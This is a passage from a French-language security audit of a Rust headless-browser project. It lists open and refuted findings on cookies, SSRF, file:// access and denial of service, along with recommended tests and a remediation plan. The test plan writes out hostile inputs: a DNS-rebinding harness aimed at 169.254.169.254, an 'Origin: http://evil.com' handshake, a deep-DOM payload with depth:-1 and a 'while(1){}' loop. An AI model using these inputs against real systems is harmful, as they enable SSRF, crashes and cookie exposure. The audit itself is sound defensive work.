- **OVERFLOW-WORKERPORT-01** (Info) — `worker_port = port + 1 + i` (main.rs:406) sur u16 sans garde ; `--port 65535 --workers N` panique (debug) ou wrappe (release). A3 / `--workers>1` seulement. Remédiation : `checked_add` + erreur CLI claire.
- **COOK-06-CONFIRM** (Info) — jar en clair, 0o600 Unix-only ; chemin race-free (NamedTempFile + persist atomique), seul gap = storage_dir choisi par l'opérateur. Pas d'exposition sous flags défaut (pas de cookies sur disque).

---

## 4. Résidus documentés — statut

| Résidu | Statut | Preuve |
|---|---|---|
| **COOK-04** (SameSite non appliqué à l'egress) | **Confirmé encore ouvert** | `get_cookie_header` (cookies.rs:149-162) ne lit jamais `entry.same_site` ; signature mono-URL sans origine initiatrice. **Mais** une variante du finding refusant l'exploitabilité a été refutée (le fetch page-JS `ops.rs:722` gate sur `!is_cross_origin`) — la version confirmée Élevée porte sur le **chemin de navigation** (`client.rs:529`, `wreq_client.rs:153`) et les redirections serveur, non couverts. CSRF réel via Lax/Strict. |
| **file:// jail (OPS-02)** | **Confirmé encore ouvert** (FILE-GATE-05) | `fetch_file_url` (client.rs:293-326) : `to_file_path()` + `tokio::fs::read` sans racine/canonicalisation/jail. Le **gate** `file://` lui (activation) est vérifié correct sur toutes les entrées CDP ; le résidu n'apparaît que **quand** `--allow-file-access` est activé. |
| **AX-02** (getFullAXTree super-linéaire) | **Reclassé — refuté** | La prémisse quadratique est fausse : les nœuds à rôle vide (Doctype/Comment/PI) sont structurellement des feuilles (tree_sink.rs), donc le walk ascendant (accessibility.rs:112-124) sort après une itération. Coût O(N) borné par `MAX_NODES=1M`. Reste un O(N) linéaire sous le lock V8 sans timeout tokio — observation matériellement plus faible que le quadratique revendiqué. |
| **wreq streaming cap (NAVDOS)** | **Confirmé encore ouvert** (DOS-WREQ et alias) | `wreq_client.rs:200` pré-check Content-Length puis `:208 resp.bytes()` ; commentaire en code (197-199) l'admet en follow-up. Chunked/sans-longueur non borné. `--stealth` requis. |
| **OPS-03** (boucle sync Runtime.evaluate) | **Maintenant mitigé / confirmé correct** | `cdp_watchdog` armé pour tout non-`is_v8_free_method` (dispatch.rs:304-310) ; `terminate_execution()` interrompt le JS synchrone (cdp_watchdog.rs:61-62) ; génération monotone anti-disarm-périmé ; `cancel_v8_termination()` avant la commande suivante. Couvre `Runtime.evaluate` ET `callFunctionOn`. Recommandation : conserver un test d'intégration `while(1){}` sur le socket CDP réel, car la garantie dépend de l'armement par le dispatcher à chaque commande V8. |

---

## 5. Candidats rejetés (le filtre de vérification a fonctionné)

| Id | Pourquoi réfuté |
|---|---|
| FILE-GATE-03 | `validate_fetch_url` laisse passer `file://` mais reqwest (sans feature file) n'a pas de transport file:// → aucune lecture. Hardening Info au mieux. |
| FILE-GATE-04 | Redirection HTTP→file:// ne lit aucun fichier : `fetch_file_url` n'est appelé que sur l'URL initiale hors boucle de redirection ; wreq ne l'invoque jamais. Le finding dit lui-même « No read today ». |
| OPS-04-VERIFY | La vérification « origine non spoofable » est **fausse** pour le chemin `<script src>` dynamique (`pageOrigin` dérivé de `location.href`→`__virtualUrl`, settable via pushState). La conclusion « verified safe » ne tient pas — mais le finding était une vérification, pas un nouvel exploit. |
| OPS-ML-SSRF-VERIFY | Vérification Info correcte : SSRF du chargeur de modules réellement fermé (validate_fetch_url + resolver + `Policy::none()`). Pas d'exploit. |
| OPS-BINDING-1 | `op_binding_called` ne donne pas de capacité nette : la page possède déjà le wrapper `globalThis[name]` dans le même realm. Hardening Info. |
| DOS-AX02 / AX-02-CONFIRM | Quadratique inexistant (nœuds rôle-vide = feuilles) ; O(N) borné par MAX_NODES. |
| DOS-MCP1 / DOS-NODES1 | Affirment une non-vulnérabilité (cap 16 MiB / arène 1M) — vérifiés corrects. |
| CDP-WS-HOSTPIN-NULLBIND-1 | Pas de PoC sous flags défaut : l'Origin gate (default-deny) s'exécute avant le Host pin ; navigateurs ne forgent pas Host ; seul un client natif loopback déjà confié peut présenter un Host IP étranger. |
| COOKIE-DATE-01 | `0u64 - 1` (wrapping) = expiry un jour **plus tôt**, pas « far-future » ; impact réel inoffensif. Panic debug-only hors scope. |
| PANIC-DISPATCH-01 | Aucun déclencheur A2 prouvé sous code actuel ; candidats de panic tous gardés ou test-only. |
| UNSAFE-TREESINK-OK / FETCH-REWRITE-OK | Affirment du code sound / non exploitable — vérifiés corrects (Ref-guard sound ; override Fetch.* = code mort jamais peuplé). |
| OPS-04-N2 | `redact_proxy` premier `@` : logué seulement en `info!`, supprimé par le filtre `warn` par défaut. A3-only, non atteignable sous flags défaut. |
| OPS-CFG-N5 | `--host` ignoré en multi-worker = direction sûre (bind loopback codé en dur). Mismatch config, pas faille. |
| OPS-06-CONFIRM | `--v8-flags` = argv opérateur (A3 confié), appliqué une fois au démarrage, double garde `Once`. Pas d'influence A1/A2. |
| COOK-04-OPEN | Variante refusant l'exploitabilité du SameSite : refutée car le fetch page-JS gate déjà sur `!is_cross_origin` (la version confirmée porte sur la navigation, cf. §3/§4). |

---

## 6. Lacunes de couverture & recommandations de suivi

**Lacunes identifiées (à lister explicitement) :**
1. **Lecture non authentifiée du jar de cookies via CDP** (symétrique de COOK-CDP-INJECT-1) — `Network.getAllCookies`/`Storage.getCookies` renvoient **tous** les cookies, HttpOnly et Secure inclus (`network.rs:55-58`, `storage.rs:14-18`, `cookies.rs:168-186`), atteignable par un process local co-résident (pas d'Origin → gate inapplicable). C'est le **chemin d'exposition de données le plus impactant sous flags défaut**. Largement inhérent au design no-auth, mais doit être documenté comme tel et, idéalement, gated par un opt-in/token.
2. **Multi-worker abandonne silencieusement `--host`/`--allow-file-access`/`--allow-private-network`** (main.rs:356-358,428) — direction fail-safe mais footgun de confusion (`--host 0.0.0.0 --workers 2` n'écoute que loopback).
3. **Divergence des deux serializers DOM** — le CDP (`dom.rs:235-284`) n'a pas reçu le durcissement du DOM-crate (mécanisme de DOS-DOM-CDP-1).
4. **Amplification mémoire post-cap** d'`op_fetch_url` (DOS-OPS-AMP-1) et **frontière path cookie** (COOK-PATH-BOUND-1) — déjà capturées en §3.

**Zones revues et jugées propres :** `encoding.rs` (allocation bornée, parsing via encoding_rs, sniff borné à 1 Ko) ; `interceptor.rs`/`robots.rs` (off par défaut, ne fait que restreindre l'egress propre) ; `markdown.rs` (récursion dans le sandbox V8, bornée par RangeError + watchdog) ; surface des ops V8 (aucune n'expose fs/process/env) ; classification `is_v8_free_method` (aucun handler mal classé n'atteint JsRuntime).

**Tests dynamiques recommandés :**
- **Harness DNS-rebinding** : domaine TTL court alternant IP publique ↔ 169.254.169.254 / 127.0.0.1, sur les 4 clients, asserter le rejet « SSRF blocked » au connect.
- **Test de régression handshake CDP-WS** : ouvrir une socket, envoyer upgrade avec `Origin: http://evil.com`, asserter 403 (manquant côté `obscura-cdp/tests`, contrairement à MCP `cors_preflight.rs`).
- **Fuzz du parser d'IP littérales** : `validate_url` avec `::a.b.c.d`, `2002::`, formes décimales/hex/octales, IPv4-mapped/NAT64 (couvrir SSRF-N1).
- **Fuzz/test DOM profond** : `'<div>'.repeat(100000)` puis `DOM.getDocument {depth:-1}` sur socket CDP réel, asserter pas d'abort (DOS-DOM-CDP-1).
- **Test OOM bornée** : `import()` / fetch d'un body chunked sans Content-Length (+ `Content-Encoding: br`), asserter troncation/erreur sous le cap (DOS-N1, DOS-WREQ).
- **Test sync-loop** : `Runtime.evaluate('while(1){}')` sur le socket réel, asserter que le dispatcher reste réactif (garde OPS-03).

---

## 7. Plan de remédiation priorisé

1. **Caper le chargeur de modules ES** (DOS-N1) — remplacer `resp.text()` (module_loader.rs:110) par `read_body_capped` + décodage. *Egress page-atteignable non capé sous flags défaut ; correctif ~1 ligne, parité immédiate.*
2. **Plafonner le serializer DOM CDP** (DOS-DOM-CDP-1) — plafond interne ≤1000 dans `serialize_node` (dom.rs:235-284) + clamp d'un `depth` négatif. *Abort process à distance via l'idiome standard `depth:-1`.*
3. **Valider le scope sur l'ingestion cookie CDP/MCP** (COOK-CDP-INJECT-1 + COOK-03-PSL-STORED-DOMAIN + COOK-PREFIX-MISSING) — router `set_cookies_from_cdp` (cookies.rs:188) par `is_cookie_domain_allowed` + rejet suffixe public + règles `__Host-`/`__Secure-`. *Ferme l'injection cross-site/supercookie et la fixation de session.*
4. **Appliquer SameSite à l'egress** (COOK-04) — propager l'origine initiatrice dans navigation+redirection et `get_cookie_header`. *Restaure la protection CSRF. À défaut immédiat, documenter l'absence.*
5. **Caper le client stealth wreq** (DOS-WREQ) — lecture streamée bornée (wreq_client.rs:197-210). *Ferme l'OOM `--stealth`.*
6. **Canonicaliser les littéraux IPv6** (SSRF-N1) — traiter `::a.b.c.d` et `2002::/16` dans `is_forbidden_ip` (client.rs) + tests. *Complète la canonicalisation revendiquée.*
7. **Redacter le proxy dans les erreurs `op_fetch_url`** (OPS-04-N1) — `redact_proxy`/chaîne fixe (ops.rs:526). *Stoppe la fuite de credentials vers la page.*
8. **Jail `--allow-file-access`** (FILE-GATE-05) — racine obligatoire + canonicalisation/préfixe (client.rs:293). *Transforme un grant filesystem total en grant scopé.*
9. **PSL complète** (COOK-PSL-HARDCODED-GAPS) — crate `publicsuffix` (cookies.rs:541). *Couvre les suffixes privés cloud abusés.*
10. **Durcir la chaîne d'appro CI/CD** (ACTIONS-UNPINNED-N1, DOCKER-NO-LOCKED-N2, SEMGREP-NEUTERED-N3, DENY-NO-LICENSES-N4) — épingler les Actions par SHA (release/docker en priorité) ; `--locked` dans le Dockerfile ; retirer `continue-on-error` de Semgrep ; ajouter `licenses` à cargo-deny.
11. **Réduire l'amplification mémoire `op_fetch_url`** (DOS-OPS-AMP-1) — éviter les triples copies (ops.rs:865-880) ; envisager un cap agrégé par-process.
12. **Footgun d'exposition réseau** (HOST-0000-1) — warning + opt-in explicite pour le bind non-loopback ; warning quand le SSRF guard est off (OPS-CFG-N3) ; proxy worker via `OBSCURA_PROXY` (OPS-CFG-N4).
13. **Correctifs faibles restants** — Host pin sur `/json/*` (CDP-JSON-1) ; filtre d'en-têtes sur la navigation CDP (HDR-NAV-FILTER-N5) ; frontière path cookie (COOK-PATH-BOUND-1) ; DACL Windows du jar (COOK-06-WINDOWS-PERMS) ; redesign `Element` (UNSAFE-PAGE-01) ; `checked_add` worker_port (OVERFLOW-WORKERPORT-01).
